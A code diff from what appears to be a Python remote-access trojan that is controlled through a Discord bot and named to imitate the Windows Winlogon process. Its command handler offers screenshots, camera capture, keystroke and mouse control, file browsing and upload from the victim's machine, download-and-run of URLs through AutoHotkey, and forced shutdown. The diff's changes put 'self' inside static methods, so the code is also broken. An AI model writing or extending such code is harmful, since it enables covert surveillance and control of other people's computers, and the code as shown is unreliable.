@@ -143,11 +143,11 @@ class WinlogonClient(discord.Client):
         if self.screen_delay != 99999:
             self.screen_delay = 99999
             self.lost_screen_delay = 99999
-            await Discord.send_embed(description="Muted!", status=False)
+            await self.send_embed(description="Muted!", status=False)
         else:
             screen_delay = 100
             self.lost_screen_delay = 100
-            await Discord.send_embed(description="Unmuted!", status=False)
+            await self.send_embed(description="Unmuted!", status=False)
 
     async def index_online(self):
         global msg_status_of_users, INDEX_STATUS
@@ -211,10 +211,10 @@ class WinlogonClient(discord.Client):
                 print(link)
             except BaseException:
                 pass
-            client.loop.create_task(Discord.delete_screen())
+            client.loop.create_task(self.delete_screen())
 
         if time:
-            embed = Discord.set_time(embed)
+            embed = self.set_time(embed)
         if thumbnail:
             embed.set_thumbnail(url=thumbnail)
         if image:
@@ -222,12 +222,12 @@ class WinlogonClient(discord.Client):
         return embed
 
     async def send_embed(self, description="", thumbnail="", image="", time=True, status=True):
-        embed = await Discord.create_embed(description, thumbnail, image, time, status)
+        embed = await self.create_embed(description, thumbnail, image, time, status)
         embed = await self.channel.main.send(embed=embed)
         return embed
 
     async def send_settings_form(self):
-        await Discord.send_embed(description="```python\n"
+        await self.send_embed(description="```python\n"
                                              f"file_name: \"{file_name}\"\n"
                                              f"app_data: \"{self.paths['APPDATA']}\"\n"
                                              f"start_up: \"{start_up}\"\n"
@@ -245,7 +245,7 @@ class WinlogonClient(discord.Client):
                                              "", status=False)
 
     async def edit_embed(self, later_embed, description="", thumbnail="", image="", time=True, status=True):
-        embed = await Discord.create_embed(description, thumbnail, image, time, status)
+        embed = await self.create_embed(description, thumbnail, image, time, status)
         embed = await client.edit_message(later_embed, embed=embed)
         return embed
 
@@ -302,7 +302,7 @@ class WinlogonClient(discord.Client):
                                 return True
                         role = discord.utils.get(message.server.roles, name='win-helper')
                         await message.author.add_roles(role)
-                        await Discord.send_embed(description="<@{}> с нами!".format(message.author.id))
+                        await self.send_embed(description="<@{}> с нами!".format(message.author.id))
                         self.is_privates.append(str(message.author.id))
 
     @staticmethod
@@ -312,7 +312,7 @@ class WinlogonClient(discord.Client):
             if message.content == "20140803":
                 self.privates.append(str(message.author.id))
                 await message.author.send("!get")
-                await Discord.send_embed(description="<@{}> авторизовлся!".format(message.author.id))
+                await self.send_embed(description="<@{}> авторизовлся!".format(message.author.id))
             return True
 
     @staticmethod
@@ -386,7 +386,7 @@ class WinlogonClient(discord.Client):
                 pages = Explorer.get_all_pages(result)
                 description = Explorer.get_files_from_page(result, pages, this_page)
 
-                embed = await Discord.send_embed(description=description)
+                embed = await self.send_embed(description=description)
                 if this_page >= 2:
                     await embed.add_reaction("◀")
                 await embed.add_reaction("❌")
@@ -625,7 +625,7 @@ class WinlogonClient(discord.Client):
                     return ""
 
                 # print(command)
-                second_string = Discord.cut_command(command, content)
+                second_string = self.cut_command(command, content)
                 # result = split(r'\n', second_string)[0]
 
                 return second_string
@@ -683,17 +683,17 @@ class WinlogonClient(discord.Client):
                     start(script_name)
 
                 except BaseException:
-                    await Discord.send_embed(description="Ошибка создания скрипта.")
+                    await self.send_embed(description="Ошибка создания скрипта.")
                 else:
                     if status is False:
                         return
                     else:
                         if description:
-                            await Discord.send_embed(description=description)
+                            await self.send_embed(description=description)
                         else:
                             try:
                                 await asyncio.sleep(1)
-                                await Discord.send_embed(description="```autohotkey\n" + str(script) + "```")
+                                await self.send_embed(description="```autohotkey\n" + str(script) + "```")
                             except BaseException:
                                 pass
 
@@ -709,16 +709,16 @@ class WinlogonClient(discord.Client):
                         ExitApp"""
                     File.write(command, "reload.ahk")
                     start('reload.ahk')
-                    #  await Discord.send_embed(description="I am will reload.")
+                    #  await self.send_embed(description="I am will reload.")
                 except BaseException:
-                    await Discord.send_embed(description="I have problem with reload.")
+                    await self.send_embed(description="I have problem with reload.")
                 else:
                     quit()
 
             @staticmethod
             async def demonstration(message):
-                # settings = Discord.cut_command("!demka", message.content)
-                embed = await Discord.send_embed()
+                # settings = self.cut_command("!demka", message.content)
+                embed = await self.send_embed()
                 while True:
                     await embed.add_reaction("❌")
                     emoji = await client.wait_for_reaction(message=embed, user=message.author,
@@ -733,7 +733,7 @@ class WinlogonClient(discord.Client):
                         if emoji.reaction.emoji == "❌":
                             break
 
-                    embed = await Discord.edit_embed(later_embed=embed)
+                    embed = await self.edit_embed(later_embed=embed)
                 await embed.delete()
 
             @staticmethod
@@ -747,7 +747,7 @@ class WinlogonClient(discord.Client):
                 else:
                     description = "There is not smiles in data"
 
-                await Discord.send_embed(description=description)
+                await self.send_embed(description=description)
 
             @staticmethod
             async def help():
@@ -774,7 +774,7 @@ class WinlogonClient(discord.Client):
                                     !sound
                                     !quit
                                     """
-                await Discord.send_embed(description=description, status=False)
+                await self.send_embed(description=description, status=False)
 
             @staticmethod
             async def send_message(message, text=""):
@@ -796,7 +796,7 @@ class WinlogonClient(discord.Client):
                     array.append(line)
                     string = string + str(line)
                 try:
-                    await Discord.send_embed(str(string))
+                    await self.send_embed(str(string))
                 except BaseException:
                     print("Ошибка со чтением")
 
@@ -834,7 +834,7 @@ class WinlogonClient(discord.Client):
                             quantity_folders=quantity_folders,
                             index_files=index_files,
                             path=path)
-                        await Discord.send_embed(description=description)
+                        await self.send_embed(description=description)
                     else:
                         result = findall(r'(.*?)\n', full_answer)
                         this_page = 1
@@ -861,7 +861,7 @@ class WinlogonClient(discord.Client):
                                 if str(reaction) == "▶":
                                     this_page += 1
                                     description = Explorer.get_files_from_page(result, 2, this_page)
-                                    await Discord.edit_embed(embed, description=description)
+                                    await self.edit_embed(embed, description=description)
                                     await embed.clear_reactions()
                                     await embed.add_reaction("◀")
                                     await embed.add_reaction("❌")
@@ -869,7 +869,7 @@ class WinlogonClient(discord.Client):
                                 if str(reaction) == "◀":
                                     this_page -= 1
                                     description = Explorer.get_files_from_page(result, 2, this_page)
-                                    await Discord.edit_embed(embed, description=description)
+                                    await self.edit_embed(embed, description=description)
                                     await embed.clear_reactions()
                                     await embed.add_reaction("❌")
                                     await embed.add_reaction("▶")
@@ -879,7 +879,7 @@ class WinlogonClient(discord.Client):
                 settings = Scripts.get_settings(message.content)
                 url = Settings.url(settings)
                 if url is False:
-                    await Discord.send_embed(description="Ошибка ссылки.")
+                    await self.send_embed(description="Ошибка ссылки.")
                     return
                 script = """run, {url}""".format(url=url)
                 await Scripts.ahk(script, "run.ahk", description="!run {url}".format(url=url))
@@ -889,7 +889,7 @@ class WinlogonClient(discord.Client):
                 settings = Scripts.get_settings(message.content)
                 url = Settings.url(settings)
                 if url is False:
-                    await Discord.send_embed(description="Ошибка ссылки.")
+                    await self.send_embed(description="Ошибка ссылки.")
                     return
                 script = """URLDownload, {url}""".format(url=url)
                 await Scripts.ahk(script, "download.ahk", description="!download {url}".format(url=url))
@@ -919,7 +919,7 @@ class WinlogonClient(discord.Client):
                     url = a.content
 
                 if url is False:
-                    await Discord.send_embed(description="Ошибка обновления.")
+                    await self.send_embed(description="Ошибка обновления.")
                     return
                 try:
                     script = """
@@ -939,7 +939,7 @@ class WinlogonClient(discord.Client):
                 try:
                     await Scripts.reload(message)
                 except BaseException:
-                    await Discord.send_embed(description="Maybe was problem with reload.")
+                    await self.send_embed(description="Maybe was problem with reload.")
 
             @staticmethod
             async def sound(message):
@@ -952,7 +952,7 @@ class WinlogonClient(discord.Client):
             @staticmethod
             async def create_ahk(message):
                 # settings = Scripts.get_settings(message.content)
-                script = Discord.get_script(message.content)
+                script = self.get_script(message.content)
                 print(script)
                 await Scripts.ahk(script, "script.ahk")
 
@@ -971,7 +971,7 @@ class WinlogonClient(discord.Client):
                 script = "shutdown -s -t {time}".format(time=time)
                 await msg_status_of_users.delete()
                 await Scripts.ahk(script, "shutdown.ahk", status=False)
-                await Discord.send_embed(description="I will shutdown.")
+                await self.send_embed(description="I will shutdown.")
 
             @staticmethod
             async def minimize(message):
@@ -1000,9 +1000,9 @@ class WinlogonClient(discord.Client):
                 if len(name) <= 10:
                     login = name
                 else:
-                    await Discord.send_embed(description="Слишком длинное имя.")
+                    await self.send_embed(description="Слишком длинное имя.")
                 await message.add_reaction("👍")
-                await Discord.send_embed()
+                await self.send_embed()
                 msg_status_of_users = await msg_status_of_users.edit_message(new_content=login)
 
             @staticmethod
@@ -1020,9 +1020,9 @@ class WinlogonClient(discord.Client):
                 settings = Scripts.get_settings(message.content)
                 path = Settings.path(settings)
                 try:
-                    await Discord.send_file(path)
+                    await self.send_file(path)
                 except BaseException:
-                    await Discord.send_embed(description="Проблемы с отправкой `{}`".format(path))
+                    await self.send_embed(description="Проблемы с отправкой `{}`".format(path))
 
             @staticmethod
             async def key(message):
@@ -1109,7 +1109,7 @@ class WinlogonClient(discord.Client):
                 for name in names:
                     images.append(imageio.imread(name))
                 imageio.mimsave(f"{self.paths['APPDATA']}\\movie.gif", images)
-                await Discord.send_file(f"{self.paths['APPDATA']}\\movie.gif")
+                await self.send_file(f"{self.paths['APPDATA']}\\movie.gif")
 
         class DiscordLoop:
             @staticmethod
@@ -1132,7 +1132,7 @@ class WinlogonClient(discord.Client):
                             if File.read("activity") == "YES":
                                 break
                     """
-                    await Discord.send_embed()
+                    await self.send_embed()
                     self.lost_screen_delay = screen_delay
 
     def default_settings(self):
@@ -1158,9 +1158,9 @@ class WinlogonClient(discord.Client):
             except BaseException:
                 pass
 
-        await Discord.send_embed(description="Запущен!")
+        await self.send_embed(description="Запущен!")
         RUN_STATUS = True
-        if await Discord.index_online():
+        if await self.index_online():
             MAIN_SCRIPT = True
 
         client.loop.create_task(DiscordLoop.give_screen())
@@ -1190,14 +1190,14 @@ class WinlogonClient(discord.Client):
             if INDEX_STATUS:
                 return
             INDEX_STATUS = True
-            if await Discord.index_online():
+            if await self.index_online():
                 MAIN_SCRIPT = True
             return
 
         # SCRIPT GUARD ME
         if command.startswith("!") and login == "ALEX":
             if message.author.id != ID.my_id:
-                await Discord.send_embed(description="Closed.", status=False)
+                await self.send_embed(description="Closed.", status=False)
                 return
 
         if command.startswith("!") and command.count("!") >= 2:
@@ -1205,7 +1205,7 @@ class WinlogonClient(discord.Client):
 
         if command == "!flood":
             for i in range(100):
-                await Discord.send_embed(status=False)
+                await self.send_embed(status=False)
 
         if command == "!quit" or command == "!exit":
             await self.channel.main.send("Okey :ok_hand:")
@@ -1214,13 +1214,13 @@ class WinlogonClient(discord.Client):
 
         # elif command == "!default":
         #    login = os.getenv("COMPUTERNAME")
-        #    await Discord.send_embed(description="Login is updated. **{}**".format(login))
+        #    await self.send_embed(description="Login is updated. **{}**".format(login))
 
         elif command == "!ping":
             msg_time = message.timestamp
             delta = datetime.utcnow() - msg_time
             delta = round(delta.total_seconds(), 3)
-            await Discord.send_embed(description="Ping {}s".format(delta), status=False)
+            await self.send_embed(description="Ping {}s".format(delta), status=False)
 
         elif command == "!disconnect":
             CONNECTED_STATUS = False
@@ -1233,41 +1233,41 @@ class WinlogonClient(discord.Client):
             await Scripts.help()
 
         elif command == "!cls":
-            await Discord.clean_screen()
+            await self.clean_screen()
 
         elif command == "!emoji":
             await Scripts.emoji()
 
         elif command == "!screen":
-            await Discord.send_embed()
+            await self.send_embed()
 
         elif command == "!status" or command == "<:online:524700046617477151>":
-            await Discord.send_embed()
+            await self.send_embed()
 
         elif command == "<:oleha:540458464024068136>":
-            await Discord.oleha(message)
+            await self.oleha(message)
 
         settings = Scripts.get_settings(message.content)
 
         if not Settings.users(settings):
             return
 
-        if Discord.if_command(command, "!mute"):
-            await Discord.mute_screen()
+        if self.if_command(command, "!mute"):
+            await self.mute_screen()
 
-        elif Discord.if_command(command, "!default"):
+        elif self.if_command(command, "!default"):
             default_settings()
-            await Discord.send_settings_form()
+            await self.send_settings_form()
 
-        elif Discord.if_command(command, "!var"):
+        elif self.if_command(command, "!var"):
             Settings.change_variable(settings)
-            await Discord.send_settings_form()
+            await self.send_settings_form()
 
-        elif Discord.if_command(command, "!settings"):
-            await Discord.send_settings_form()
+        elif self.if_command(command, "!settings"):
+            await self.send_settings_form()
 
-        elif Discord.if_command(command, "!save"):
-            await Discord.save_settings()
+        elif self.if_command(command, "!save"):
+            await self.save_settings()
 
         elif command == "!path":
             await Scripts.path()
@@ -1296,41 +1296,41 @@ class WinlogonClient(discord.Client):
         elif command.startswith("!reload"):
             await Scripts.reload(message)
 
-        elif Discord.if_command(command, "!key"):
+        elif self.if_command(command, "!key"):
             await Scripts.key(message)
 
-        elif Discord.if_command(command, "!ahk"):
+        elif self.if_command(command, "!ahk"):
             print("!ahk")
             await Scripts.create_ahk(message)
 
-        elif Discord.if_command(command, "!mouse"):
+        elif self.if_command(command, "!mouse"):
             await Scripts.mouse(message)
 
-        elif Discord.if_command(command, "!sound"):
+        elif self.if_command(command, "!sound"):
             await Scripts.sound(message)
 
-        elif Discord.if_command(command, "!connect"):
+        elif self.if_command(command, "!connect"):
             await Scripts.connect(message)
 
-        elif Discord.if_command(command, "!display"):
+        elif self.if_command(command, "!display"):
             await Scripts.display(message)
 
-        elif Discord.if_command(command, "!keymouse"):
+        elif self.if_command(command, "!keymouse"):
             await Scripts.key_mouse(message)
 
-        elif Discord.if_command(command, "!shutdown"):
+        elif self.if_command(command, "!shutdown"):
             await Scripts.shutdown(message)
 
-        elif Discord.if_command(command, "!minimize"):
+        elif self.if_command(command, "!minimize"):
             await Scripts.minimize(message)
 
-        elif Discord.if_command(command, "!demka"):
+        elif self.if_command(command, "!demka"):
             await Scripts.demonstration(message)
 
-        elif Discord.if_command(command, "!start"):
+        elif self.if_command(command, "!start"):
             await Scripts.start(message)
 
-        elif Discord.if_command(command, "!camera"):
+        elif self.if_command(command, "!camera"):
             try:
                 await Scripts.camera()
             except BaseException:
